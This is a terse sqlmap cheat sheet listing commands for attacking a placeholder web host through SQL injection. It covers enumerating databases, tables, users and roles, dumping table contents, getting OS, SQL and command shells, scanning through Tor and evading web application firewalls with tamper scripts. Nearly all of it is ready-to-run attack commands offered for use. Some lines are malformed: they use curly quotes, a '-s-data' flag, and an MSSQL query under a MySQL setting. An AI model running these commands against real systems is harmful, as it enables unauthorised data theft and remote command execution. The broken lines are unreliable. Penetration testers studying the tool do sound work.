— — CHEAT SHEET — —
# Enum DB

sqlmap --dbms=mysql -u “http://takumatest.domain/" --dbs

# Enum tables

sqlmap --dbms=mysql -u “http://takumatest.domain/" -D target_DB --tables

--current-user : enum current user

--current-db : enum db name

# Use POST methods

sqlmap --dbms=mysql -u “http://takumatest.domain/" --data=”data1=aaa&data2=bbb”

# List of users and roles

sqlmap --dbms=mysql -u “http://takumatest.domain/" --users --roles --threads=10

# Custom Query

sqlmap --dbms=mysql -u “http://takumatest.domain/" --sql-query=”select * from master.sys.server_principals”

# Dump table

sqlmap --dbms=mysql -u “http://takumatest.domain/" -D target_DB -T target_Table --dump

# List columns

sqlmap --dbms=mysql -u “http://takumatest.domain/" -D target_DB -T target_Table --columns

# Parameter

sqlmap --dbms=mysql -u “http://takumatest.domain/param1=value1&param2=value2" --dbs -p param2

# Specify URIs

sqlmap --dbms=mysql -u “http://takumatest.domain/param1/value1*/param2/value2" --dbs

sqlmap -u ‘http://takumatest.domain/' --data=’param1=blah&param2=blah’ --cookie=’JSESSIONID=d02084cbe50e16aa4' --level=5 --risk=3 -p param1

# OS Shell

sqlmap --dbms=mysql -u “http://takumatest.domain/" --os-shell

# SQL Shell

sqlmap --dbms=mysql -u “http://takumatest.domain/" --sql-shell

# CMD Shell

sqlmap --dbms=mysql -u “http://takumatest.domain/" --os-cmd whoami

# Query

sqlmap --dbms=mysql -u “http://takumatest.domain/" -D target_DB --sql-query “SELECT * FROM TABLE;”

# Scan through TOR

sqlmap -u “http://takumatest.domain/" --tor --tor-type=SOCKS5 --check-tor --dbms=mysql --dbs

# Basic authen & NTLM

sqlmap -u “http://takumatest.domain/” -s-data=param1=value1&param2=value2 -p param1 --auth-type=[basic/ntlm] --auth-cred=username:password

#Proxy

sqlmap -u “http://takumatest.domain/” --proxy=http://proxy_address:port

#Specific point to inject use *

sqlmap -u “http://takumatest.domain/abc/def/123*/data.php”

#Dump Limit

--start=1 --stop=10

#Bypass WAF (for example)

--tamper=”between,randomcase,space2comment”

#Techniques

--technique=BEUST
Stacked queries (S)
Error based (E)
Union query based (U)
Inline queries (I)
Boolean blind (B)
Time based blind (T)

#Clear cache

--fresh-queries
--flush-session
